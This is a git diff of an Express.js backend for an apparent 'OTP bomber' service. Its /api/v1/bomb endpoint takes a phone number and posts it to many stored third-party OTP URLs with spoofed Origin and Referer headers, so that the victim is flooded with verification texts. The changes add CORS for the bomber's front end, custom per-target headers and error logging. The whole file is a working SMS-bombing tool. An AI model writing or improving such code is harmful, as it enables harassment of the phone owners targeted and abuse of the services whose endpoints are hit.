@@ -3,11 +3,16 @@ const { connectToMongoDb } = require("./service");
 const URL = require("./Model/url");
 const app = express();
 const axios = require("axios");
+const cors = require("cors");
 require("dotenv").config();
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 connectToMongoDb(process.env.MONGO_URI);
-
+const corsOption = {
+    origin: "http://otpbomber.vercel.app",
+    optionsSuccessStatus: 200,
+};
+app.use(cors(corsOption));
 app.post("/api/v1/bomb", async (req, res) => {
     const { number, total } = req.body;
     let urls = await URL.find().limit(total);
@@ -20,7 +25,7 @@ app.post("/api/v1/bomb", async (req, res) => {
                 [url.numberKey]: url.mobileNumber
                     ? (url.mobileNumber += String(number))
                     : String(number),
-                ...url.otherFields,
+                ...url?.otherFields,
             };
             try {
                 await axios.post(`${url.url}`, data, {
@@ -29,9 +34,12 @@ app.post("/api/v1/bomb", async (req, res) => {
                         "Access-Control-Allow-Origin": "*",
                         Origin: url.url,
                         Referer: url.url,
+                        ...url?.otherHeaders,
                     },
                 });
-            } catch (error) {}
+            } catch (error) {
+                console.log(error);
+            }
             i++;
         } else {
             res.json({ message: "Execution Done" });
